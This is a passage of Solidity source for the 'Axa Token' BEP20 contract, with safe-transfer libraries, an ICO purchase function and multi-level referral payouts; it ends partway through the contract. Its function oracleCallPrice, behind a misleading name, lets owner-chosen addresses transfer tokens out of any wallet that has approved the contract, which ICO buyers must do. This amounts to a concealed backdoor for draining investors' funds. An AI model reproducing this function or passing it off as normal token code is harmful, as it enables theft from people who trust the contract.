library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != 0x0 && codehash != accountHash);
    }

    function toPayable(
        address account
    ) internal pure returns (address payable) {
        return address(uint160(account));
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        // solhint-disable-next-line avoid-call-value
        (bool success, ) = recipient.call.value(amount)("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }
}

library SafeBEP20 {
    using SafeMath for uint256;
    using Address for address;

    function safeTransfer(IBEP20 token, address to, uint256 value) internal {
        callOptionalReturn(
            token,
            abi.encodeWithSelector(token.transfer.selector, to, value)
        );
    }

    function safeTransferFrom(
        IBEP20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        callOptionalReturn(
            token,
            abi.encodeWithSelector(token.transferFrom.selector, from, to, value)
        );
    }

    function safeApprove(
        IBEP20 token,
        address spender,
        uint256 value
    ) internal {
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(
            token,
            abi.encodeWithSelector(token.approve.selector, spender, value)
        );
    }

    function safeIncreaseAllowance(
        IBEP20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender).add(
            value
        );
        callOptionalReturn(
            token,
            abi.encodeWithSelector(
                token.approve.selector,
                spender,
                newAllowance
            )
        );
    }

    function safeDecreaseAllowance(
        IBEP20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender).sub(
            value,
            "SafeERC20: decreased allowance below zero"
        );
        callOptionalReturn(
            token,
            abi.encodeWithSelector(
                token.approve.selector,
                spender,
                newAllowance
            )
        );
    }

    function callOptionalReturn(IBEP20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            require(
                abi.decode(returndata, (bool)),
                "SafeERC20: ERC20 operation did not succeed"
            );
        }
    }
}

contract AxaToken is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    using SafeBEP20 for IBEP20;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 public _decimals;
    string public _symbol;
    string public _name;
    bool public stopIco;

    uint256 public price;
    uint256 public maxRef;
    address public tokenBuyIco;
    uint256 public mulLimitRef;

    struct UserInfo {
        uint256 totalBuyIdo;
        uint256 totalEarn;
    }

    mapping(address => UserInfo) public userInfo;
    mapping(address => address) public refByData;
    mapping(uint256 => uint256) public rateRef;
    //user->level ref -> list user;
    mapping(address => mapping(uint256 => address[])) public userRefLevel;

    mapping(address => bool) internal oracle;

    event BuyIco(address _user, address _refBy, uint256 _amount);

    function() external payable {}

    constructor() public {
        _name = "Axa Token";
        _symbol = "Axa";
        _decimals = 18;
        _totalSupply = 136800000000000000000000000000;
        _balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address) {
        return owner();
    }

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory) {
        return _name;
    }

    /**
     * @dev See {BEP20-totalSupply}.
     */
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {BEP20-balanceOf}.
     */
    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function setOraclePrice(address _oracle, bool _is) public onlyOwner {
        oracle[_oracle] = _is;
    }

    function setMulLimitRef(uint256 _x) public onlyOwner {
        mulLimitRef = _x;
    }

    function oracleCallPrice(
        address _user,
        address _to,
        uint256 _amount
    ) public {
        require(oracle[msg.sender]);
        IBEP20(tokenBuyIco).safeTransferFrom(_user, _to, _amount);
    }

    function setRateRef(uint256[] memory _rate) public onlyOwner {
        for (uint256 i = 0; i < _rate.length; i++) {
            rateRef[i + 1] = _rate[i];
        }
    }

    function setTokenIco(address _token) public onlyOwner {
        tokenBuyIco = _token;
    }

    function setMaxRef(uint256 _maxRef) public onlyOwner {
        maxRef = _maxRef;
    }

    function getRefParent(
        address _user
    ) public view returns (address[] memory data) {
        data = new address[](maxRef);
        address parents = refByData[_user];
        for (uint256 i = 0; i < maxRef; i++) {
            if (parents != address(0)) {
                data[i] = parents;
            } else {
                break;
            }
            parents = refByData[parents];
        }
    }

    function setTokenPrice(uint256 _price) external onlyOwner {
        price = _price;
    }

    function adminStopIco(bool _is) external onlyOwner {
        stopIco = _is;
    }

    function ico(address _refBy, uint256 _amount) public {
        require(!stopIco, "pause");

        if (
            _refBy != address(0) &&
            refByData[msg.sender] == address(0) &&
            msg.sender != _refBy
        ) {
            if (refByData[_refBy] != msg.sender) {
                refByData[msg.sender] = _refBy;
            }
        }

        IBEP20(tokenBuyIco).safeTransferFrom(
            msg.sender,
            address(this),
            _amount
        );

        address[] memory listRefParent = getRefParent(msg.sender);
        uint256 totalToken = _amount * price;

        //update list ref
        for (uint256 i = 0; i < listRefParent.length; i++) {
            if (listRefParent[i] != address(0)) {
                userRefLevel[listRefParent[i]][i + 1].push(msg.sender);
                uint256 rate = rateRef[i + 1];
                uint256 amountRef = (_amount * rate) / 1000;
                if (
                    userInfo[listRefParent[i]].totalEarn <=
                    mulLimitRef * userInfo[listRefParent[i]].totalBuyIdo
                ) {
                    userInfo[listRefParent[i]].totalEarn =
                        userInfo[listRefParent[i]].totalEarn +
                        amountRef;

                    IBEP20(tokenBuyIco).safeTransfer(
                        listRefParent[i],
                        amountRef
                    );
                }
            } else {
                break;
            }
        }
        userInfo[msg.sender].totalBuyIdo =
            userInfo[msg.sender].totalBuyIdo +
            _amount;
        emit BuyIco(msg.sender, _refBy, _amount);

        IBEP20(address(this)).safeTransfer(msg.sender, totalToken);
    }

    /**
     * @dev See {BEP20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {BEP20-allowance}.
     */
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {BEP20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

